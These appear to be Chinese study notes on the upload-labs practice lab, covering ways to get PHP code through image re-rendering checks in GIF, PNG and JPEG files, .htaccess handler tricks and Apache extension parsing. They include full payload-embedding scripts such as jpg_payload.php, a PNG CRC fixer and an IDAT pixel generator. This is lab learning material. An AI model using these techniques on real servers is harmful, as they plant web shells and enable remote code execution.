<h3 id="exif-imagetype函数-未成功"><a href="#exif-imagetype函数-未成功" class="headerlink" title="exif_imagetype函数  未成功"></a>exif_imagetype函数  未成功</h3><p><img src="https://upload-images.jianshu.io/upload_images/11525934-3f2f0a6ebbc90ff9.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/568" alt="img"></p>
<h3 id="二次渲染-需要使用文件包含漏洞"><a href="#二次渲染-需要使用文件包含漏洞" class="headerlink" title="二次渲染  需要使用文件包含漏洞"></a>二次渲染  需要使用文件包含漏洞</h3><h4 id="gif-成功"><a href="#gif-成功" class="headerlink" title="gif  成功"></a>gif  成功</h4><p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p>
<p>![image-20200729160518402](5 文件上传/image-20200729160518402.png)</p>
<p>包含成功  </p>
<p>127.0.0.1/upload-labs-master/include.php?file=upload/15294.gif  蚁剑连之</p>
<p>![image-20200729161032008](5 文件上传/image-20200729161032008.png)</p>
<h4 id="png-1"><a href="#png-1" class="headerlink" title="png"></a>png</h4><p>在网上找到了两种方式来制作绕过二次渲染的png木马.</p>
<h5 id="写入PLTE数据块-失败"><a href="#写入PLTE数据块-失败" class="headerlink" title="写入PLTE数据块  失败"></a>写入PLTE数据块  失败</h5><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p>
<p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
<ol>
<li>在PLTE数据块写入php代码.<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30847062-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30847062-ab24-1.png" alt="img"></a></li>
<li>计算PLTE数据块的CRC<br>CRC脚本</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = open(<span class="string">r'2.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">''' PLTE crc '''</span></span><br><span class="line">data =  <span class="string">'504c5445'</span>+ re.findall(<span class="string">'504c5445(.*?)49444154'</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:<span class="number">-16</span>].decode(<span class="string">'hex'</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">print</span> hex(crc)</span><br><span class="line">我的</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = open(<span class="string">r'3.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">''' PLTE crc '''</span></span><br><span class="line">data =  <span class="string">'504c5445'</span>+ re.findall(<span class="string">'504c5445(.*?)49444154'</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:<span class="number">-16</span>].decode(<span class="string">'hex'</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">print(hex(crc))</span><br><span class="line"></span><br><span class="line"><span class="number">0xf23ad211</span> L</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">526579b0</span><br></pre></td></tr></table></figure>

<p>3.修改CRC值</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30948bfa-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30948bfa-ab24-1.png" alt="img"></a></p>
<p>4.验证<br>将修改后的png图片上传后,下载到本地打开<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30a39e2e-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30a39e2e-ab24-1.png" alt="img"></a></p>
<h5 id="写入IDAT数据块-并不算成功"><a href="#写入IDAT数据块-并不算成功" class="headerlink" title="写入IDAT数据块 并不算成功"></a>写入IDAT数据块 并不算成功</h5><p>这里有国外大牛写的脚本,直接拿来运行即可.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行后得到1.png.上传后下载到本地打开如下图</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30b19aec-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30b19aec-ab24-1.png" alt="img"></a></p>
<h4 id="jpeg-没试成功"><a href="#jpeg-没试成功" class="headerlink" title="jpeg 没试成功"></a>jpeg 没试成功</h4><p>这里也采用国外大牛编写的脚本jpg_payload.php.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?=phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>1.jpg</code>.</p>
<h5 id="插入php代码"><a href="#插入php代码" class="headerlink" title="插入php代码"></a>插入php代码</h5><p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30bb4236-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30bb4236-ab24-1.png" alt="img"></a><br>使用16进制编辑器打开,就可以看到插入的php代码.<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30c860b0-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30c860b0-ab24-1.png" alt="img"></a></p>
<h5 id="上传图片马"><a href="#上传图片马" class="headerlink" title="上传图片马"></a>上传图片马</h5><p>将生成的<code>payload_1.jpg</code>上传.<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30d3a1a0-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30d3a1a0-ab24-1.png" alt="img"></a></p>
<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>将上传的图片再次下载到本地,使用16进制编辑器打开<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30e17b68-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30e17b68-ab24-1.png" alt="img"></a></p>
<p>可以看到,php代码没有被去除.<br>证明我们成功上传了含有php代码的图片.</p>
<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
<h2 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测"></a>文件相关信息检测</h2><h2 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h2><h1 id="解析攻击"><a href="#解析攻击" class="headerlink" title="解析攻击"></a>解析攻击</h1><h2 id="直接解析"><a href="#直接解析" class="headerlink" title="直接解析"></a>直接解析</h2><h2 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="本地文件包含解析"></a>本地文件包含解析</h2><p><a href="http://127.0.0.1/upload-labs-master/include.php?file=upload/202007291402101138.Php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs-master/include.php?file=upload/202007291402101138.Php</a> 使用文件包含来解析Php</p>
<h2 id="htaccess-解析"><a href="#htaccess-解析" class="headerlink" title=".htaccess 解析"></a>.htaccess 解析</h2><p>使用.htaccess解析上传的jpg</p>
<p>虽然还是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件:</p>
<p>![image-20200729111116730](5 文件上传/image-20200729111116730.png)</p>
<p>1.</p>
<p>构造.htaccess文件，内容如下:<code>AddType application/x-httpd-php .jpg</code><br> 这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果</p>
<p>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
<p>2..htaccess内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"文件名"</span>&gt;</span><br><span class="line"> SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">    </span><br><span class="line">&lt;FilesMatch <span class="string">"1"</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">同目录有个我们上传一个只有文件名并包含字符串<span class="string">"haha"</span>，但是却无任何扩展名的文件</span><br><span class="line">里面的内容是 php 一句话木马</span><br></pre></td></tr></table></figure>



<h2 id="web-应用程序解析漏洞及其原理"><a href="#web-应用程序解析漏洞及其原理" class="headerlink" title="web 应用程序解析漏洞及其原理"></a>web 应用程序解析漏洞及其原理</h2><h3 id="Apache-解析漏洞-（多）"><a href="#Apache-解析漏洞-（多）" class="headerlink" title="Apache 解析漏洞 （多）"></a>Apache 解析漏洞 （多）</h3><p>第十八关</p>
<p>把shell文件名改为shell.php.7z。apache会把它当做php文件进行解析。</p>
